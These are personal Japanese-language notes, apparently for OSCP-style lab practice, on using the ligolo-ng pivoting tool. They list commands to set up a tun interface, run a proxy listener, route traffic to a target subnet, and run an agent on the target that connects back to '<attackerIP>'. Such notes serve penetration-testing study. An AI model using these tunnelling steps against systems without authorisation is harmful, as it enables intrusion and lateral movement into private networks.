# ligolo

[ligoloの使い方、参考ページ](https://systemweakness.com/everything-about-pivoting-oscp-active-directory-lateral-movement-6ed34faa08a2)

- agentとproxyというバイナリをそれぞれ/usr/bin/に置いたので、agentのバイナリをまずはターゲット上に置く必要がある。また、ターゲットOSによってバイナリを変える必要があるので、都度githubから引っ張ってくる必要がある。
  
[ソースはここから](https://github.com/nicocha30/ligolo-ng/releases)

## コマンド集

0. ダウンロードしてきたファイルを解凍する。
```
sudo tar -xzvf <target_file>
```

1. tunをセットする。
```
$ sudo ip tuntap add user [your_username] mode tun ligolo
$ sudo ip link set ligolo up
```

2. リバースプロキシを立ち上げる。ポーとは9001で待ち受けておく。
```
proxy -selfcert -laddr 0.0.0.0:9001
```

3. 利用できるインターフェースを一覧表示する。
```
session
ifconfig
```

4. 10.10.127.0/24サブネット宛ての全てのパケットを、ligolo tunインターフェースを介して送信するようにKali上で設定する。(これ自体はligoloのコマンドではなくKali上での設定)
```
sudo ip route add 10.10.127.0/24 dev ligolo
```
5. 上記までの手順を行った後に、セッションをスタートする。これでtargetサブネット上の内部ネットワークと、Kali上から直接やり取りができるようになる。
```
session
start
```

6. ローカルポートフォワーディングするための設定。
```
sudo ip route add 240.0.0.1/32 dev ligolo
```

### Agent側
1. 
```
./agent.exe -connect <attackerIP>:port -ignore-cert
```